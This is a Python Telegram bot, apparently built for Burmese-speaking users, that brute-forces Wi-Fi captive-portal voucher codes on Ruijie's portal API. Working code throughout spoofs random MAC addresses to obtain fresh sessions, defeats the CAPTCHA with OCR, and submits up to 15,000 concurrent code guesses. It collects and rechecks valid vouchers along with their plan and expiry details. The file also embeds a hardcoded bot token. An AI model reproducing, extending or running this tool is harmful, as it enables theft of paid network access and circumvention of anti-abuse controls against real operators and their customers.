# -*- coding: utf-8 -*-
import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from datetime import datetime, timezone
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2, ddddocr, numpy as np
from collections import deque

BOT_TOKEN = "8445541083:AAGP0OwAyugyfz1Nd5KX9Eo1NVZqd7rT48"
ADMIN_ID = "6621675335"

# ════════════════════════════════════════════════════════════════
#  ​ရောင်ရန်မဟုပါ သကယ်လို့​ရောင် ခြင်စိတ်ဖစ်လာရင်
#            ဖင်သာ​ပြေးခံပါ ════════════════════════════════════════════════════════════════
CONCURRENCY = 15000
BATCH_SIZE = 10000
TIMEOUT = 100

bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
success_messages = {}
limited_messages = {}
retry_counts = {}

session = None
_connector = None
_voucher_sem = None
_start_time = time.monotonic()
_ocr = None

async def answer_callback(call, text=None, show_alert=False):
    await bot.answer_callback_query(call.id, text=text, show_alert=show_alert)

def get_ocr():
    global _ocr
    if _ocr is None:
        _ocr = ddddocr.DdddOcr(show_ad=False)
    return _ocr

STATE_FILE = "state.json"
HITS_FILE = "hits.json"

def save_state():
    try:
        payload = {"user_data": {str(k): v for k, v in user_data.items()}}
        with open(STATE_FILE, "w") as f:
            json.dump(payload, f)
    except Exception as e:
        print(f"[err] {e}")

def load_state():
    global user_data
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE) as f:
            payload = json.load(f)
        for k, v in payload.get("user_data", {}).items():
            user_data[int(k)] = v
    except Exception as e:
        print(f"[err] {e}")

def save_hits():
    try:
        with open(HITS_FILE, "w") as f:
            json.dump({str(k): v for k, v in success_texts.items()}, f, indent=2)
    except Exception as e:
        print(f"[err] {e}")

def load_hits():
    try:
        if not os.path.exists(HITS_FILE):
            return
        with open(HITS_FILE) as f:
            payload = json.load(f)
        for k, v in payload.items():
            try:
                success_texts[int(k)] = v
            except ValueError:
                continue
    except Exception as e:
        print(f"[err] {e}")

_web_start = time.time()

async def handle(request):
    up = int(time.time() - _web_start)
    h, r = divmod(up, 3600)
    m, s = divmod(r, 60)
    return web.json_response({
        "status": "alive",
        "bot": "LORD OF DARKNESS MMHA",
        "uptime": f"{h}h {m}m {s}s"
    })

async def web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_get("/ping", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8099))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

# ==========================================
# BUTTON MENUS SYSTEM
# ==========================================

def main_control_menu(chat_id):
    has_link = chat_id in user_data and 'session_url' in user_data[chat_id]
    is_scanning = chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done()
    
    markup = InlineKeyboardMarkup(row_width=2)
    
    if is_scanning:
        markup.add(
            InlineKeyboardButton("🎃 ရပ်တန့်ရန်", callback_data="btn_stop_ritual"),
            InlineKeyboardButton("☠️ Status", callback_data="btn_realm_status")
        )
    else:
        if not has_link:
            markup.add(
                InlineKeyboardButton("☣️ Link ချိတ်ရန်", callback_data="btn_guide_bind"),
                InlineKeyboardButton("🤖 လမ်းညွှန်", callback_data="btn_ai_guide")
            )
        else:
            markup.add(
                InlineKeyboardButton("👁️ Scan စတင်ရန်", callback_data="btn_open_scan_menu"),
                InlineKeyboardButton("🗡️ Recheck", callback_data="btn_recheck_saved")
            )
            markup.add(
                InlineKeyboardButton("⚰️ သိမ်းထားသော Hits", callback_data="btn_view_saved"),
                InlineKeyboardButton("⚧️ Link ပြောင်းရန်", callback_data="btn_guide_bind")
            )
            markup.add(
                InlineKeyboardButton("☠️ Status", callback_data="btn_realm_status"),
                InlineKeyboardButton("🤖 လမ်းညွှန်", callback_data="btn_ai_guide")
            )
            
    return markup

def scan_modes_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🩸 6 လုံး Auto", callback_data="run_scan_6"),
        InlineKeyboardButton("🩸 8 လုံး Auto", callback_data="run_scan_8"),
        InlineKeyboardButton("🩸 10 လုံး Random", callback_data="run_scan_10"),
        InlineKeyboardButton("🩸 12 လုံး Random", callback_data="run_scan_12"),
        InlineKeyboardButton("👁️ 9 လုံး Custom", callback_data="run_scan_num_9"),
        InlineKeyboardButton("👁️ 14 လုံး Custom", callback_data="run_scan_num_14"),
        InlineKeyboardButton("🔤 a-z စာလုံးသေး", callback_data="run_scan_lower"),
        InlineKeyboardButton("🔤 A-Z စာလုံးကြီး", callback_data="run_scan_upper"),
        InlineKeyboardButton("🔠 စာလုံး ရောစပ်", callback_data="run_scan_mixcase"),
        InlineKeyboardButton("🔥 စာလုံး + နံပါတ်", callback_data="run_scan_all"),
        InlineKeyboardButton("🔙 Main Menu", callback_data="btn_back_main")
    )
    return markup

def ai_guidance_keyboard():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🩸 ၁။ Link ချိတ်ဆက်နည်း", callback_data="guide_info_1"),
        InlineKeyboardButton("👁️ ၂။ Scan Mode အသုံးပြုနည်း", callback_data="guide_info_2"),
        InlineKeyboardButton("🗡️ ၃။ Hits နှင့် Expiry", callback_data="guide_info_3"),
        InlineKeyboardButton("⚡ ၄။ Speed နှင့် Error ဖြေရှင်းနည်း", callback_data="guide_info_4"),
        InlineKeyboardButton("🔙 Main Menu", callback_data="btn_back_main")
    )
    return markup

def get_spooky_glitch_char():
    symbols = ['☠️', '🩸', '👁️', '💀', '🕯️', '⚰️', '🧟', '👹']
    return random.choice(symbols)

def generate_horror_bar(pct, length=12):
    filled = int(length * (pct / 100))
    bar = "🩸" * filled + "🕯️" * (length - filled)
    return f"⚰️ [{bar}] {pct:.1f}% ⚰️"

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} souls/min"
    spooky = get_spooky_glitch_char()
    
    if total is not None:
        pct = (checked / total) * 100 if total > 0 else 0
        bar = generate_horror_bar(pct)
        return (
            f"🩸 <b>[ LORD OF DARKNESS AI RITUAL ]</b> 🩸\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👁️ <b>RITUAL STATUS</b> : <code>SUMMONING...</code> {spooky}\n"
            f"☠️ <b>SACRIFICES HITS</b>: <code>{found} SOULS</code>\n"
            f"⚡ <b>EXECUTION SPEED</b>: <code>{speed_str}</code>\n"
            f"🩸 <b>CURSED RETRIES</b>  : <code>{retries}</code>\n"
            f"📦 <b>SOULS DEVOURING</b>: <code>{checked:,}</code> / <code>{total:,}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bar}\n"
            f"<i>\"The LORD OF DARKNESS AI consumes all.\"</i>"
        )
    
    return (
        f"🩸 <b>[ LORD OF DARKNESS AI RITUAL ]</b> 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👁️ <b>RITUAL STATUS</b> : <code>DEVOURING...</code> {spooky}\n"
        f"☠️ <b>SACRIFICES HITS</b>: <code>{found} SOULS</code>\n"
        f"⚡ <b>EXECUTION SPEED</b>: <code>{speed_str}</code>\n"
        f"🩸 <b>CURSED RETRIES</b>  : <code>{retries}</code>\n"
        f"📦 <b>SOULS DEVOURING</b>: <code>{checked:,}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🕯️ <i>LORD OF DARKNESS AI searching the void...</i>"
    )

def format_completion(checked, found, elapsed_time):
    m, s = divmod(int(elapsed_time), 60)
    time_str = f"{m}m {s}s" if m > 0 else f"{s}s"
    
    return (
        f"⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️\n"
        f"☠️ <b>LORD OF DARKNESS RITUAL COMPLETED</b> ☠️\n"
        f"⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️\n\n"
        f"🗡️ <b>[ DARKNESS REAP ]</b>\n"
        f"• <b>Total Devoured</b> : <code>{checked:,} Souls</code>\n"
        f"• <b>Captured Hits</b>  : <code>{found} Victories</code> 🩸\n"
        f"• <b>Ritual Time</b>    : <code>{time_str}</code>\n\n"
        f"👻 <i>The LORD OF DARKNESS AI awaits next order...</i>"
    )

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

async def get_session_id(sess, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

def _ocr_worker(img_bytes):
    try:
        arr = np.frombuffer(img_bytes, np.uint8)
        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        _, buf = cv2.imencode(".png", gray)
        return get_ocr().classification(buf.tobytes()).upper()
    except:
        return None

async def parse_captcha_text(img_bytes):
    return await asyncio.to_thread(_ocr_worker, img_bytes)

async def fetch_captcha_img(sess, session_id):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    try:
        async with sess.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
            return await req.read()
    except:
        return None

async def verify_captcha(sess, session_id, text):
    headers = {
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    try:
        async with sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except:
        return None

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode in ["8", "10", "12"]:
        length = int(mode)
        while True:
            yield "".join(random.choice(string.digits) for _ in range(length))
            
    if mode.startswith("num_"):
        length = int(mode.split("_")[1])
        while True:
            yield "".join(random.choice(string.digits) for _ in range(length))
            
    if mode == "lower":
        while True:
            yield "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    if mode == "upper":
        while True:
            yield "".join(random.choice(string.ascii_uppercase) for _ in range(8))
    if mode == "mixcase":
        while True:
            yield "".join(random.choice(string.ascii_letters) for _ in range(8))
            
    if mode == "all":
        chars = string.ascii_letters + string.digits
        while True:
            yield "".join(random.choice(chars) for _ in range(8))

    raise ValueError(f"Invalid mode: {mode}")

def format_minutes(total_minutes):
    if total_minutes is None or total_minutes == "":
        return 'Unknown'
    try:
        mins = int(float(total_minutes))
        if mins < 0:
            return 'Expired'
        h, m = divmod(mins, 60)
        if h > 0 and m > 0:
            return f"{h}h {m}m"
        return f"{h}h" if h > 0 else f"{m}m"
    except:
        return str(total_minutes)

def _find_first_value(value, names):
    if isinstance(value, dict):
        for key, item in value.items():
            if str(key).lower() in names and item is not None and item != "":
                return item
        for item in value.values():
            found = _find_first_value(item, names)
            if found is not None:
                return found
    elif isinstance(value, list):
        for item in value:
            found = _find_first_value(item, names)
            if found is not None:
                return found
    return None

def format_expiry_value(value):
    if value is None or value == "":
        return None
    if isinstance(value, (int, float)) or (isinstance(value, str) and value.strip().isdigit()):
        try:
            number = float(value)
            if number > 100000000000:
                number /= 1000
            if number > 1000000000:
                dt = datetime.fromtimestamp(number, tz=timezone.utc).astimezone()
                return dt.strftime("%Y-%m-%d %H:%M:%S %Z")
        except (ValueError, OSError, OverflowError):
            pass
    raw = str(value).strip()
    try:
        parsed = datetime.fromisoformat(raw.replace("Z", "+00:00"))
        if parsed.tzinfo is None:
            parsed = parsed.replace(tzinfo=timezone.utc)
        return parsed.astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
    except ValueError:
        return raw

async def get_expiry_info(session_id):
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
    }
    try:
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as fresh_session:
            async with fresh_session.get(
                f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
                headers=headers
            ) as req:
                res = await req.json()
                result = res.get('result') or res.get('data') or res
                profile = _find_first_value(result, {'profilename', 'packagename', 'authprofile', 'plan', 'planname', 'profile'}) or 'Standard'
                total_mins = _find_first_value(result, {'totalminutes', 'remainingminutes', 'remainminutes', 'remaintime', 'totaltime', 'limittime', 'time', 'duration', 'remainingtime'})
                expire_date = _find_first_value(result, {'expiretime', 'expiredate', 'expiredtime', 'validityperiod', 'validuntil', 'expiresat', 'expire'})
                duration = format_minutes(total_mins)
                info_parts = [f"☠️ Plan: {profile}"]
                if total_mins is not None and duration != 'Unknown':
                    info_parts.append(f"⏳ Time: {duration}")
                else:
                    info_parts.append("⏳ Time: Unavailable")
                if expire_date:
                    info_parts.append(f"📅 Expire: {format_expiry_value(expire_date)}")
                return " | ".join(info_parts)
    except:
        return "☠️ Plan: Active | ⏳ Time: Unavailable"

VOUCHER_URL = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
            return None

    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                return None

            auth_code = None
            for _ in range(2):
                img = await fetch_captcha_img(task_session, session_id)
                if not img: continue
                text = await parse_captcha_text(img)
                if text and await verify_captcha(task_session, session_id, text):
                    auth_code = text
                    break
            
            if not auth_code:
                return None

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            }
            
            async with task_session.post(VOUCHER_URL, json=data, headers=headers) as req:
                response = await req.text()
                
                if 'logonUrl' in response:
                    if recheck:
                        return code

                    if chat_id not in success_texts:
                        success_texts[chat_id] = []
                        
                    expire_info = await get_expiry_info(session_id)
                    success_texts[chat_id].append(f"🩸 <code>{code}</code>\n └ 🕯️ <i>{expire_info}</i>")
                    
                    code_line = "\n".join(success_texts[chat_id])
                    horror_ui = (
                        f"👁️ <b>[ LORD OF DARKNESS CAPTURED! ]</b> 🩸\n"
                        f"☠️━━━━━━━━━━━━━━━━━━━━☠️\n"
                        f"{code_line}\n"
                        f"☠️━━━━━━━━━━━━━━━━━━━━☠️\n"
                        f"👻 <i>Claimed by LORD OF DARKNESS AI...</i>"
                    )
                    
                    try:
                        if chat_id not in success_messages:
                            sent = await bot.send_message(chat_id, horror_ui, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
                            success_messages[chat_id] = sent.message_id
                        else:
                            await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id], text=horror_ui, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
                    except:
                        pass
                    save_hits()
                    return code
    except:
        pass
    return None

async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e), reply_markup=main_control_menu(chat_id))
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    last_ui_update = time.monotonic()
    
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    return await perform_check(session_url, c, chat_id, scan_id)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

            checked += len(batch)
            now = time.monotonic()
            
            if now - last_ui_update > 2.0:
                last_ui_update = now
                elapsed = now - scan_start
                speed = (checked / elapsed * 60) if elapsed > 0 else 0
                found = len(success_texts.get(chat_id, []))
                retries = retry_counts.get(chat_id, 0)
                text = format_progress(checked, total, speed, found, retries)
                
                try:
                    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
                except:
                    pass

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            finish_text = format_completion(checked, final_found, elapsed)
            
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
            except:
                await bot.send_message(chat_id, finish_text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
    finally:
        scan_tasks.pop(chat_id, None)

@bot.message_handler(commands=['start', 'menu'])
async def start_interactive_menu(message):
    chat_id = message.chat.id
    text = (
        "🩸 <b>[ LORD OF DARKNESS INTERACTIVE CONTROL ]</b> 🩸\n\n"
        "<i>\"ငါ LORD OF DARKNESS မှ အသင့်ရှိနေသည်။ Command များ ရိုက်ရန် မလိုဘဲ အောက်ပါ ခလုတ်များဖြင့်သာ အဆင့်ဆင့် ခိုင်းစေနိုင်ပါသည်။\"</i>"
    )
    await bot.reply_to(message, text, parse_mode="HTML", reply_markup=main_control_menu(chat_id))

@bot.callback_query_handler(func=lambda call: True)
async def handle_button_actions(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    data = call.data

    if data == "btn_back_main":
        await bot.edit_message_text(
            "🩸 <b>[ LORD OF DARKNESS MAIN CONTROL ]</b> 🩸\n\n"
            "<i>\"အောက်ပါ ခလုတ်များဖြင့် လိုအပ်သော လုပ်ဆောင်ချက်ကို ရွေးချယ်ပါ။\"</i>",
            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id)
        )
        await answer_callback(call)
        return

    if data == "btn_guide_bind":
        text = (
            "🩸 <b>[ SOUL LINK BINDING ]</b>\n\n"
            "<b>အသုံးပြုပုံ:</b> Captive Portal URL ကို ကူးယူပြီး ဤ Chat ထဲသို့ <b>တိုက်ရိုက် Paste လုပ်၍ ပို့ပေးပါ။</b>"
        )
        await bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
        await answer_callback(call)
        return

    if data == "btn_open_scan_menu":
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await answer_callback(call, "☠️ ပထမဦးစွာ Link ချိတ်ဆက်ပေးရန် လိုအပ်ပါသည်!", show_alert=True)
            return
        
        await bot.edit_message_text(
            "👁️ <b>[ SELECT RITUAL MODE ]</b>\n\n"
            "<i>\"အောက်ပါ ခလုတ်များမှ စစ်ဆေးလိုသော Digit သို့မဟုတ် Pattern ကို ရွေးချယ်ပါ။\"</i>",
            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=scan_modes_keyboard()
        )
        await answer_callback(call)
        return

    if data.startswith("run_scan_"):
        mode = data.replace("run_scan_", "")
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await answer_callback(call, "⚡ LORD OF DARKNESS သည် လက်ရှိတွင် Scan ပြုလုပ်နေဆဲ ဖြစ်ပါသည်!", show_alert=True)
            return

        progress_msg = await bot.edit_message_text(
            "🩸 <i>LORD OF DARKNESS initiating ritual...</i>", 
            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id)
        )
        
        scan_id = str(uuid.uuid4())
        task = asyncio.create_task(
            run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, progress_msg=progress_msg)
        )
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await answer_callback(call)
        return

    if data == "btn_stop_ritual":
        task_data = scan_tasks.get(chat_id)
        if task_data and not task_data["task"].done():
            task_data["stop"] = True
            task_data["scan_id"] = None
            task_data["task"].cancel()
            
            await bot.edit_message_text(
                "🕯️ <b>LORD OF DARKNESS ritual banished!</b>", 
                chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id)
            )
        await answer_callback(call)
        return

    if data == "btn_view_saved":
        success = success_texts.get(chat_id, [])
        if not success:
            await answer_callback(call, "⚰️ Graveyard ထဲတွင် Hits မရှိသေးပါ!", show_alert=True)
            return

        parts = [f"🩸 <b>LORD OF DARKNESS HITS</b> ({len(success)})"]
        parts.extend(success[:20])

        await bot.edit_message_text("\n\n".join(parts), chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
        await answer_callback(call)
        return

    if data == "btn_recheck_saved":
        success = success_texts.get(chat_id, [])
        if not success:
            await answer_callback(call, "👻 ပြန်လည် စစ်ဆေးရန် Hits မရှိသေးပါ!", show_alert=True)
            return

        await bot.edit_message_text("🗡️ <i>LORD OF DARKNESS resurrecting souls...</i>", chat_id=chat_id, message_id=msg_id, parse_mode="HTML")
        new_success = []
        for item in success:
            code = item.split("<code>")[1].split("</code>")[0] if "<code>" in item else item
            recode = await perform_check(user_data[chat_id]['session_url'], code, chat_id, recheck=True)
            if recode:
                new_success.append(item)

        success_texts[chat_id] = new_success
        save_hits()
        await bot.edit_message_text(f"🩸 <b>{len(new_success)} souls still belong to LORD OF DARKNESS!</b>", chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
        await answer_callback(call)
        return

    if data == "btn_realm_status":
        active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
        up_secs = int(time.monotonic() - _start_time)
        h, r = divmod(up_secs, 3600)
        m, s = divmod(r, 60)
        total_found = sum(len(v) for v in success_texts.values())

        status_text = (
            f"🩸 <b>LORD OF DARKNESS REALM METRICS</b> 🩸\n\n"
            f"⏱ <b>Uptime</b>: <code>{h}h {m}m {s}s</code>\n"
            f"👁️ <b>Active Rituals</b>: <code>{active_scans}</code>\n"
            f"🧟 <b>Bound Souls</b>: <code>{len(user_data)}</code>\n"
            f"⚰️ <b>Total Captured</b>: <code>{total_found}</code>\n"
        )
        await bot.edit_message_text(status_text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
        await answer_callback(call)
        return

    if data == "btn_ai_guide":
        await bot.edit_message_text(
            "🤖 <b>[ AI GUIDANCE MENU ]</b>\n\n"
            "<i>\"သိရှိလိုသော အကြောင်းအရာ ခလုတ်ကို နှိပ်ပါ:\"</i>",
            chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=ai_guidance_keyboard()
        )
        await answer_callback(call)
        return

@bot.message_handler(func=lambda msg: msg.text and not msg.text.startswith("/"))
async def auto_link_handler(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    if text.startswith("http://") or text.startswith("https://"):
        if await check_session_url(text):
            user_data.setdefault(chat_id, {})
            user_data[chat_id]['session_url'] = text
            success_texts.pop(chat_id, None)
            save_state()
            
            resp = "🩸 <b>[ SOUL LINK BOUND SUCCESSFUL ]</b>\n\n<i>Scan ခလုတ်ကို နှိပ်၍ စတင်နိုင်ပါပြီ။</i>"
            await bot.reply_to(message, resp, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
        else:
            await bot.reply_to(message, "☠️ <b>[ INVALID LINK ] Link တွင် gw_id, mac, ip ပါဝင်ရပါမည်။</b>", parse_mode="HTML", reply_markup=main_control_menu(chat_id))

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=0, force_close=False, ssl=False)
    session = aiohttp.ClientSession(connector=_connector)

    asyncio.create_task(web_server())
    load_state()
    load_hits()

    print("High-Speed Bot is Running...")
    await bot.infinity_polling(timeout=20, request_timeout=35)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
